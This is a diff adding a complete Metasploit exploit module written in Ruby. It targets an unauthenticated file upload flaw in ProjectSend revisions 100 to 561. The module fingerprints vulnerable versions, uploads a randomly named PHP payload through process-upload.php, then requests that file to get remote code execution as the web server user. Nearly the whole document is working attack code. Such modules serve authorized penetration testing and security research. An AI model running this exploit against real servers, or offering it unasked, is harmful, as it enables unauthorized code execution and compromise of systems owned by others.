@@ -1,0 +1,166 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::FileDropper
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => 'ProjectSend Arbitrary File Upload',
+      'Description'    => %q{
+        This module exploits a file upload vulnerability in ProjectSend
+        revisions 100 to 561. The 'process-upload.php' file allows
+        unauthenticated users to upload PHP files resulting in remote
+        code execution as the web server user.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Fady Mohammed Osman', # Discovery and Exploit
+          'Brendan Coles <bcoles[at]gmail.com>' # Metasploit
+        ],
+      'References'     =>
+        [
+          ['EDB', '35424']
+        ],
+      'Payload'        =>
+        {
+          'BadChars'   => "\x00"
+        },
+      'Arch'           => ARCH_PHP,
+      'Platform'       => 'php',
+      'Targets'        =>
+        [
+          # Tested on ProjectSend revisions 100, 157, 180, 250, 335, 405 and 561 on Apache (Ubuntu)
+          ['ProjectSend (PHP Payload)', {}]
+        ],
+      'Privileged'     => false,
+      'DisclosureDate' => 'Dec 02 2014',
+      'DefaultTarget'  => 0))
+
+      register_options(
+        [
+          OptString.new('TARGETURI', [true, 'The base path to ProjectSend', '/ProjectSend/'])
+        ], self.class)
+  end
+
+  #
+  # Checks if target upload functionality is working
+  #
+  def check
+    res = send_request_cgi(
+      'uri' => normalize_uri(target_uri.path, 'process-upload.php')
+    )
+    if !res
+      vprint_error("#{peer} - Connection timed out")
+      return Exploit::CheckCode::Unknown
+    elsif res.code.to_i == 404
+      vprint_error("#{peer} - No process-upload.php found")
+      return Exploit::CheckCode::Safe
+    elsif res.code.to_i == 500
+      vprint_error("#{peer} - Unable to write file")
+      return Exploit::CheckCode::Safe
+    elsif res.code.to_i == 200 && res.body && res.body =~ /<\?php/
+      vprint_error("#{peer} - File process-upload.php is not executable")
+      return Exploit::CheckCode::Safe
+    elsif res.code.to_i == 200 && res.body && res.body =~ /sys\.config\.php/
+      vprint_error("#{peer} - Software is misconfigured")
+      return Exploit::CheckCode::Safe
+    elsif res.code.to_i == 200 && res.body && res.body =~ /jsonrpc/
+      # response on revision 118 onwards includes the file name
+      if res.body && res.body =~ /NewFileName/
+        return Exploit::CheckCode::Vulnerable
+      # response on revisions 100 to 117 does not include the file name
+      elsif res.body && res.body =~ /{"jsonrpc" : "2.0", "result" : null, "id" : "id"}/
+        return Exploit::CheckCode::Appears
+      elsif res.body && res.body =~ /Failed to open output stream/
+        vprint_error("#{peer} - Upload folder is not writable")
+        return Exploit::CheckCode::Safe
+      else
+        return Exploit::CheckCode::Detected
+      end
+    else
+      return Exploit::CheckCode::Safe
+    end
+  end
+
+  #
+  # Upload PHP payload
+  #
+  def upload
+    fname = "#{rand_text_alphanumeric(rand(10) + 6)}.php"
+    php = "<?php #{payload.encoded} ?>"
+    data = Rex::MIME::Message.new
+    data.add_part(php, 'application/octet-stream', nil, %(form-data; name="file"; filename="#{fname}"))
+    post_data = data.to_s
+    print_status("#{peer} - Uploading file '#{fname}' (#{php.length} bytes)")
+    res = send_request_cgi(
+      'method' => 'POST',
+      'uri'    => normalize_uri(target_uri.path, "process-upload.php?name=#{fname}"),
+      'ctype'  => "multipart/form-data; boundary=#{data.bound}",
+      'data'   => post_data
+    )
+    if !res
+      fail_with(Failure::Unknown, "#{peer} - Request timed out while uploading")
+    elsif res.code.to_i == 404
+      fail_with(Failure::NotFound, "#{peer} - No process-upload.php found")
+    elsif res.code.to_i == 500
+      fail_with(Failure::Unknown, "#{peer} - Unable to write #{fname}")
+    elsif res.code.to_i == 200 && res.body && res.body =~ /Failed to open output stream/
+      fail_with(Failure::NotVulnerable, "#{peer} - Upload folder is not writable")
+    elsif res.code.to_i == 200 && res.body && res.body =~ /<\?php/
+      fail_with(Failure::NotVulnerable, "#{peer} - File process-upload.php is not executable")
+    elsif res.code.to_i == 200 && res.body && res.body =~ /sys.config.php/
+      fail_with(Failure::NotVulnerable, "#{peer} - Software is misconfigured")
+    # response on revision 118 onwards includes the file name
+    elsif res.code.to_i == 200 && res.body && res.body =~ /NewFileName/
+      print_good("#{peer} - Payload uploaded successfully (#{fname})")
+      return fname
+    # response on revisions 100 to 117 does not include the file name
+    elsif res.code.to_i == 200 && res.body =~ /{"jsonrpc" : "2.0", "result" : null, "id" : "id"}/
+      print_warning("#{peer} - File upload may have failed")
+      return fname
+    else
+      vprint_debug("#{peer} - Received response: #{res.code} - #{res.body}")
+      fail_with(Failure::Unknown, "#{peer} - Something went wrong")
+    end
+  end
+
+  #
+  # Execute uploaded file
+  #
+  def exec(upload_path)
+    print_status("#{peer} - Executing #{upload_path}...")
+    res = send_request_raw(
+      { 'uri' => normalize_uri(target_uri.path, upload_path) }, 5
+    )
+    if !res
+      print_status("#{peer} - Request timed out while executing")
+    elsif res.code.to_i == 404
+      vprint_error("#{peer} - Not found: #{upload_path}")
+    elsif res.code.to_i == 200
+      vprint_good("#{peer} - Executed #{upload_path}")
+    else
+      print_error("#{peer} - Unexpected reply")
+    end
+  end
+
+  #
+  # upload && execute
+  #
+  def exploit
+    fname = upload
+    register_files_for_cleanup(fname)
+    exec("upload/files/#{fname}") # default for r-221 onwards
+    unless session_created?
+      exec("upload/temp/#{fname}")  # default for r-100 to r-219
+    end
+  end
+end
